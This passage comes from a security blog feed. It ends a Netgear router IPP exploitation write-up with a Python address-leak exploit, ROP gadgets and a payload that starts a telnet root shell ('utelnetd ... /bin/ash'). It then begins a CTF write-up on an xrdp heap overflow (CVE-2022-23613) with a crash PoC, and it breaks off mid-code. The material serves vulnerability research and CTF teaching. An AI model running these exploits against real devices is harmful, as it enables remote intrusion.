class="number">3</span>;</span><br><span class="line">    v10 = write_ipp_response(client_sock, final_ptr, response_len);</span><br><span class="line">    <span class="keyword">if</span> ( prefix_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(prefix_ptr);</span><br><span class="line">      prefix_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>(final_ptr);</span><br><span class="line">      final_ptr = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v10 )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  final_ptr = <span class="built_in">malloc</span>(++final_size);</span><br><span class="line">  <span class="keyword">if</span> ( final_ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(final_ptr, <span class="number">0</span>, final_size);</span><br><span class="line">    cnt = memcpy_n(final_ptr, response_len, prefix_ptr, prefix_size);</span><br><span class="line">    response_len += cnt;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_54;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¾—è®© <code>final_size</code> çš„å€¼ä¸èƒ½å¤ªå¤§ï¼Œä¸ç„¶åˆ†é…ä¸å‡ºæ¥ç¨‹åºå°±ä¸ä¼šèµ°åˆ° <code>write_ipp_response</code> é‡Œï¼Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:00010D78 loc_10D78                               ; CODE XREF: Response_Get_Jobs+868â†‘j</span><br><span class="line">.text:00010D78                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D7C                 ADD             R3, R3, #1</span><br><span class="line">.text:00010D80                 STR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D84                 LDR             R3, [R11,#-0x18]</span><br><span class="line">.text:00010D88                 MOV             R0, R3  ; size</span><br><span class="line">.text:00010D8C                 BL              malloc</span><br></pre></td></tr></table></figure><p>å³éœ€è¦è®¾ç½® <code>[R11, #-0x18]</code> çš„å€¼ï¼Œ è¿™æ˜¯åœ¨æ ˆä¸Šçš„ã€‚ æœ€åæˆ‘ leak çš„ä»£ç å¤§è‡´å¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># recv_buf[2] || recv_buf[3] == 10</span></span><br><span class="line">    recv_buf1  = <span class="string">b&#x27;\x00\x00\x00\x0a\x00\x00\x99\x99&#x27;</span></span><br><span class="line">    recv_buf2  = <span class="string">b&#x27;\x00\x44\x00\x00\x10\x5d&#x27;</span> <span class="comment"># 0x1050 is copy_len -&gt; memcpy(command, &amp;recv_buf[offset], copy_len);</span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;job-id\x00\x00&#x27;</span> </span><br><span class="line"></span><br><span class="line">    junkdata = cyclic(<span class="number">0x104c</span> , n=<span class="number">4</span>)</span><br><span class="line">    junkdata = bytearray(junkdata)</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ len(cmd)] = cmd</span><br><span class="line">    junkdata[<span class="number">0x103c</span>: <span class="number">0x103c</span> + <span class="number">4</span>] = p32(<span class="number">0x106a</span><span class="number">-0xe</span>) <span class="comment"># finish flag offset</span></span><br><span class="line">    junkdata[<span class="number">0x1048</span>: <span class="number">0x1048</span> + <span class="number">4</span>] = p32(<span class="number">0x20</span>)     <span class="comment"># malloc size  - &gt; final_ptr = malloc(++final_size);</span></span><br><span class="line">    junkdata = bytes(junkdata)</span><br><span class="line"></span><br><span class="line">    recv_buf2 += junkdata</span><br><span class="line">    recv_buf2 += p32(<span class="number">20</span>)       <span class="comment"># overwrite  prrefix_size</span></span><br><span class="line">    recv_buf2 += p32(<span class="number">0x180E4</span>)  <span class="comment"># overwrite  prefix_ptr -&gt; .got start address then free is alive </span></span><br><span class="line">    recv_buf2 += <span class="string">b&#x27;\x03&#x27;</span></span><br><span class="line"></span><br><span class="line">    payload =  <span class="string">b&#x27;POST /USB1_LQ\r\n&#x27;</span></span><br><span class="line">    payload += <span class="string">b&#x27;Content-Length: %b\r\n&#x27;</span> % str(len(recv_buf1 + recv_buf2)).encode(<span class="string">&#x27;latin1&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;\r\n&#x27;</span></span><br><span class="line"></span><br><span class="line">    p = remote(<span class="string">&quot;192.168.1.1&quot;</span>, <span class="number">631</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.send(recv_buf1)</span><br><span class="line">    p.send(recv_buf2)</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;\r\n\r\n&#x27;</span>)</span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    _dl_linux_resolve = u32(p.recvn(<span class="number">4</span>)) </span><br><span class="line">    print(<span class="string">&#x27;_dl_linux_resolve : &#123;:#x&#125;&#x27;</span>.format(_dl_linux_resolve))</span><br><span class="line">    ld_uClibc =  _dl_linux_resolve - <span class="number">0x3e70</span></span><br><span class="line">    print(<span class="string">&#x27;ld_uClibc : &#123;:#x&#125;&#x27;</span>.format(ld_uClibc))</span><br><span class="line">    p.recvn(<span class="number">4</span>)</span><br><span class="line">    printf_addr = u32(p.recvn(<span class="number">4</span>))</span><br><span class="line">    print(<span class="string">&#x27;printf : &#123;:#x&#125;&#x27;</span>.format(printf_addr))</span><br><span class="line">    uClibc = printf_addr - <span class="number">0x360e0</span></span><br><span class="line">    print(<span class="string">&#x27;uClibc : &#123;:#x&#125;&#x27;</span>.format(uClibc))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># system = uClibc + +0x90f4 # system offset </span></span><br><span class="line">    <span class="comment"># print(&#x27;system : &#123;:#x&#125;&#x27;.format(system))</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ld_uClibc, uClibc</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Leak:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3 exp_ncc_netgear_ipp.py</span><br><span class="line">[+] Opening connection to 192.168.1.1 on port 631: Done</span><br><span class="line">_dl_linux_resolve : 0x40021e70</span><br><span class="line">ld_uClibc : 0x4001e000</span><br><span class="line"><span class="built_in">printf</span> : 0x401700e0</span><br><span class="line">uClibc : 0x4013a000</span><br></pre></td></tr></table></figure><h3 id="Arbitrary-command-execution"><a href="#Arbitrary-command-execution" class="headerlink" title="Arbitrary command execution"></a>Arbitrary command execution</h3><p>é€šè¿‡æ³„æ¼ uclibc çš„åœ°å€ï¼Œ ç„¶åå¯ä»¥è®¡ç®— <code>system</code>  çš„åœ°å€ã€‚ ç„¶åæˆ‘ä»¬å°±å¯ä»¥è¿›ä¸€æ­¥åšåŠ«æŒè¿”å›åœ°å€å·¥ä½œã€‚é¦–å…ˆæˆ‘ä»¬éœ€è¦æœ‰ä¸ªä¸€ä¸ªåœ°å€æ¥å­˜å‚¨æˆ‘ä»¬ <code>system</code> å°†æ‰§è¡Œçš„å­—ç¬¦ä¸²ã€‚ å›é¡¾ä¸Šæ–‡ï¼Œ æˆ‘ä»¬æåŠåˆ°äº†ç³»ç»Ÿçš„éšæœºåŒ–ç­‰çº§ä¸º <code>1</code> ã€‚</p><p>ç³»ç»ŸéšæœºåŒ–å¼€å¯æƒ…å†µï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨å †ä¸ŠæŸ¥æ‰¾æ˜¯å¦æœ‰å¯æ§çš„å†…å®¹ï¼Œ é€šè¿‡ <code>hexdump</code> æŸ¥æ‰¾ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-e8f8895596ce61800699e533f9d7c442-efc4ee.png"></a></p><p>æˆ‘ä»¬å‘ç°æˆ‘ä»¬çš„ payload ä¼šå­˜å‚¨åœ¨ å †ä¸Šï¼Œ å› æ­¤ ï¼Œ æˆ‘ä»¬å¯ä»¥å°†è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œ åœ¨ç¬¬ä¸€æ¬¡é“¾æ¥çš„æ—¶å€™ ï¼Œ å°±å°†å‘½ä»¤å†™å…¥ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cmd = <span class="string">b&#x27;/bin/utelnetd -p 3343 -l /bin/ash \x00&#x27;</span></span><br><span class="line">cmd = <span class="string">b&#x27;/bin/touch /tmp/hacked&#x27;</span></span><br><span class="line">cmd += <span class="string">b&quot;\x00&quot;</span> * (len(cmd) % <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_uclibc</span>():</span></span><br><span class="line">...</span><br><span class="line">    junkdata[<span class="number">1026</span>: <span class="number">1026</span>+ len(cmd)] = cmd</span><br></pre></td></tr></table></figure><p>åœ¨è¦†ç›–è¿”å›åœ°å€ä¹‹å‰ ï¼Œ é™¤äº†åœ¨ leak éœ€è¦æ³¨æ„çš„é‚£å‡ ä¸ªå˜é‡ä»¥å¤– ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å•ç‹¬æ³¨æ„</p><ul><li>flag1</li><li>v17</li><li>response_len</li></ul><p>ç­‰å˜é‡çš„å€¼ï¼Œ è¦å•ç‹¬é‡æ–°èµ‹å€¼ã€‚</p><p>æœ€åæˆ‘ä»¬éœ€è¦å°† <code>R0</code> çš„å€¼æŒ‡å‘å †ä¸Šçš„ <code>0x1b880</code> åœ°å€ã€‚ æ‰€ä»¥æˆ‘ä»¬éœ€è¦å•ç‹¬å‡ ä¸ª <code>gadget</code> ï¼Œ è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯ä¸¤ä¸ª <code>gadget</code> ã€‚</p><p>é¦–å…ˆé€šè¿‡ç¬¬ä¸€ä¸ª  <code>gadget</code>  æ§åˆ¶ <code>R3</code>  ä¸º 0x1b880</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00001504 : pop &#123;r3, r4, fp, pc&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡ ç¬¬äºŒä¸ª <code>gadget</code>  å°† <code>R3</code> çš„å€¼èµ‹å€¼ç»™ <code>R0</code> å¹¶ä¸”æ§åˆ¶ PC è·³è½¬åˆ° <code>system</code> å‡½æ•°ä¸Šï¼Œä»è€Œå®Œæˆä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000a80 : mov r0, r3 ; pop &#123;fp, pc&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå°±å¯ä»¥å®Œæˆä»»æ„å‘½ä»¤æ‰§è¡Œäº†ã€‚</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-09-08-657974c446c112a83a99c724fa6581d1-a39218.png"></a></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://research.nccgroup.com/2022/08/30/ncc-con-europe-2022-pwn2own-austin-presentations/">NCC Con Europe 2022 â€“ Pwn2Own Austin Presentations</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="æ¼æ´åˆ†æ" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="netgear" scheme="https://bestwing.me/tags/netgear/"/>
    
  </entry>
  
  <entry>
    <title>2022 QWB Final RealWorld Challenge Writeup</title>
    <link href="https://bestwing.me/2022-QWB-Final-RealWorld-Challenge-Writeup.html"/>
    <id>https://bestwing.me/2022-QWB-Final-RealWorld-Challenge-Writeup.html</id>
    <published>2022-08-23T16:00:00.000Z</published>
    <updated>2023-04-29T08:11:31.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ä»Šå¹´ä¸0x300Rçš„å°ä¼™ä¼´å‚ä¸äº† 2022 QWB Final  ï¼Œ åœ¨è¿™æ¬¡æ¯”èµ›ä¸­æˆ‘å’Œå°ä¼™ä¼´ä»¬ è§£å†³äº†ä¸å°‘ RW é¢˜ç›®ï¼Œ è€Œæˆ‘æœ¬äººå‚ä¸çš„ä¸€å…±æœ‰ä¸‰é“è·¯ç”±å™¨é¢˜ã€ä¸€é“ RDP ææƒ ã€ ä¸€é“ VPN  é¢˜ç›®ã€‚åœ¨æ­¤æˆ‘ç®€å•è®°è¿°ä¸‹å…¶ä¸­çš„è·¯ç”±å™¨é¢˜ä»¥åŠ RDP é¢˜ç›®ï¼Œ è€Œ VPN é¢˜ç›®æ¶‰åŠä¸€äº›åˆ«çš„äº‹æƒ…ï¼Œå°±ä¸æ–¹ä¾¿å…¬å¼€ã€‚</p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>é¢˜ç›®è¦æ±‚æˆ‘ä»¬æ”»å‡» XRDP ç„¶åè¿›è¡Œæœ¬åœ°ææƒçš„æ•ˆæœ ï¼Œ è·å–ubuntuæ“ä½œç³»ç»Ÿrootæƒé™ï¼Œ å¹¶åœ¨/ç›®å½•æˆåŠŸå†™å…¥å†…å®¹åŒ…å«é˜Ÿä¼ç‰¹å¾çš„flagæ–‡ä»¶ã€‚</p><p>ç¨‹åºç‰ˆæœ¬ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@RDP:/home/rdp/Desktop<span class="comment"># xrdp-sesman -version</span></span><br><span class="line">xrdp-sesman 0.9.18</span><br><span class="line">  The xrdp session manager</span><br><span class="line">  Copyright (C) 2004-2020 Jay Sorg, Neutrino Labs, and all contributors.</span><br><span class="line">  See https://github.com/neutrinolabs/xrdp <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">  Configure options:</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯¥ç‰ˆæœ¬å—åˆ° <code>CVE-2022-23613</code> å½±å“</p><h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>è¡¥ä¸ä»£ç ï¼š <a href="https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa">https://github.com/neutrinolabs/xrdp/commit/4def30ab8ea445cdc06832a44c3ec40a506a0ffa</a></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">static int</span><br><span class="line">sesman_data_in(struct trans *self)</span><br><span class="line">&#123;</span><br><span class="line"><span class="addition">+ #define HEADER_SIZE 8</span></span><br><span class="line">    int version;</span><br><span class="line">    int size;</span><br><span class="line"></span><br><span class="line">    if (self-&gt;extra_flags == 0)</span><br><span class="line">    &#123;</span><br><span class="line">        in_uint32_be(self-&gt;in_s, version);</span><br><span class="line">        in_uint32_be(self-&gt;in_s, size);</span><br><span class="line"><span class="deletion">-        if (size &gt; self-&gt;in_s-&gt;size)</span></span><br><span class="line"><span class="addition">+        if (size &lt; HEADER_SIZE || size &gt; self-&gt;in_s-&gt;size)</span></span><br><span class="line">        &#123;</span><br><span class="line"><span class="deletion">-            LOG(LOG_LEVEL_ERROR, &quot;sesman_data_in: bad message size&quot;);</span></span><br><span class="line"><span class="addition">+            LOG(LOG_LEVEL_ERROR, &quot;sesman_data_in: bad message size %d&quot;, size);</span></span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        self-&gt;header_size = size;</span><br><span class="line">@@ -302,11 +303,12 @@ sesman_data_in(struct trans *self)</span><br><span class="line">            return 1;</span><br><span class="line">        &#125;</span><br><span class="line">        /* reset for next message */</span><br><span class="line"><span class="deletion">-        self-&gt;header_size = 8;</span></span><br><span class="line"><span class="addition">+        self-&gt;header_size = HEADER_SIZE;</span></span><br><span class="line">        self-&gt;extra_flags = 0;</span><br><span class="line">        init_stream(self-&gt;in_s, 0); /* Reset input stream pointers */</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line"><span class="addition">+ #undef HEADER_SIZE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/******************************************************************************/</span><br></pre></td></tr></table></figure><p>é€šè¿‡åˆ†æè¡¥ä¸ï¼Œæˆ‘ä»¬çŸ¥é“</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/sesman/sesman.c#L282</span></span><br><span class="line"></span><br><span class="line">sesman_data_in(struct trans *self)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">int</span> version;</span><br><span class="line">    <span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self-&gt;extra_flags == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        in_uint32_be(self-&gt;in_s, version);</span><br><span class="line">        in_uint32_be(self-&gt;in_s, size);</span><br><span class="line">        <span class="keyword">if</span> (size &gt; self-&gt;in_s-&gt;size)</span><br><span class="line">        &#123;</span><br><span class="line">            LOG(LOG_LEVEL_ERROR, <span class="string">&quot;sesman_data_in: bad message size&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        self-&gt;header_size = size;</span><br><span class="line">        self-&gt;extra_flags = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¢«åŠ äº†æ£€æŸ¥çš„ <code>size</code> ä¼šè¢«èµ‹å€¼åˆ° <code>self-&gt;header_size</code> ä¸­ï¼Œ å¦‚æœæˆ‘ä»¬å°† <code>size</code> å³ <code>self-&gt;header_size</code>  è®¾ç½®æˆä¸€ä¸ª<code>0x80000000</code>ï¼Œ </p><p>é‚£ä¹ˆå¯èƒ½åœ¨ æº¢å‡ºç‚¹ï¼š <a href="https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/common/trans.c#L383">https://github.com/neutrinolabs/xrdp/blob/934a91fc29c048acff74db911aed60ba67f9ff79/common/trans.c#L383</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```c</span><br><span class="line">            &#125;</span><br><span class="line">            read_so_far = (<span class="keyword">int</span>) (self-&gt;in_s-&gt;end - self-&gt;in_s-&gt;data);</span><br><span class="line">            to_read = self-&gt;header_size - read_so_far;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (to_read &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                read_bytes = self-&gt;trans_recv(self, self-&gt;in_s-&gt;end, to_read); <span class="comment">// trans_tcp_recv</span></span><br></pre></td></tr></table></figure><p>é€ æˆç¼“å†²åŒºæº¢å‡ºï¼š</p><p>å› æ­¤æˆ‘ä»¬å°è¯•æ„é€ å¦‚ä¸‹ PoCï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">    s.connect((<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">3350</span>))</span><br><span class="line">    sdata = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    sdata += struct.pack(<span class="string">&quot;I&quot;</span>,<span class="number">0x2222CCCC</span>) <span class="comment">#version</span></span><br><span class="line">    sdata += struct.pack(<span class="string">&quot;&gt;I&quot;</span>,<span class="number">0x80000000</span>) <span class="comment">#headersize</span></span><br><span class="line">    s.send(sdata)</span><br><span class="line">    print(sdata)</span><br><span class="line">    sdata = <span class="string">b&#x27;C&#x27;</span>*<span class="number">0x10000</span>  </span><br><span class="line">    s.send(sdata)</span><br></pre></td></tr></table></figure><p>å¹¶åœ¨å¯¹åº”çš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œ åœ¨è°ƒè¯•å™¨ä¸­å¯ä»¥çœ‹åˆ°ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-f031b9b71259e5040353eed64e8f6df6-590036.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-f031b9b71259e5040353eed64e8f6df6-590036.png"></a></p><p><code>r8d</code> ä¸º <code>self-&gt;header_size</code> 0x80000000<code>ï¼Œ</code>read_so_far<code>ä¸º</code>0x9` ï¼Œ </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-a0a15870467ab71c048b7d9825c5ba29-6b8164.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2022-08-24-a0a15870467ab71c048b7d9825c5ba29-6b8164.png"></a></p><p>ç›¸å‡å®Œåæ˜¯ä¸ªè´Ÿæ•°ï¼Œåœ¨æ‹·è´çš„æ—¶å€™ä¼šå‘ç”Ÿ <code>heap overflow</code></p><h3 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h3><p>å‡ºé¢˜äººä¿®æ”¹äº† <code>MAX_SHORT_LIVED_CONNECTIONS</code></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/sesman/sesman.c b/sesman/sesman.c</span><br><span class="line">index a8576905..38a2f642 100644</span><br><span class="line"><span class="comment">--- a/sesman/sesman.c</span></span><br><span class="line"><span class="comment">+++ b/sesman/sesman.c</span></span><br><span class="line"><span class="meta">@@ -40,7 +40,7 @@</span></span><br><span class="line">  * At the moment, all connections to sesman are short-lived. This may change</span><br><span class="line">  * in the future</span><br><span class="line">  */</span><br><span class="line"><span class="deletion">-#define MAX_SHORT_LIVED_CONNECTIONS 16</span></span><br><span class="line"><span class="addition">+#define MAX_SHORT_LIVED_CONNECTIONS 512</span></span><br><span class="line"></span><br><span class="line"> struct sesman_startup_params</span><br><span class="line"> &#123;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡å †å–·ï¼Œè¦†ç›–ç»“æ„ä½“æŒ‡é’ˆæ¥è¾¾åˆ°æ§åˆ¶ PC çš„ç›®çš„ï¼Œ é€šè¿‡ä»£ç é˜…è¯»ï¼Œæˆ‘ä»¬å‘ç°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trans</span> *</span></span><br><span class="line"><span class="class"><span class="title">trans_create</span>(<span class="title">int</span> <span class="title">mode</span>, <span class="title">int</span> <span class="title">in_size</span>, <span class="title">int</span> <span class="title">out_size</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trans</span> *<span class="title">self</span> = (<span class="title">struct</span> <span class="title">trans</span> *) <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">    self = (struct trans *) g_malloc(<span class="keyword">sizeof</span>(struct trans), <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (self != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        make_stream(self-&gt;in_s);</span><br><span class="line">        init_stream(self-&gt;in_s, in_size);</span><br><span class="line">        make_stream(self-&gt;out_s);</span><br><span class="line">        init_stream(self-&gt;out_s, out_size);</span><br><span class="line">        self-&gt;mode = mode;</span><br><span class="line">        self-&gt;tls = <span 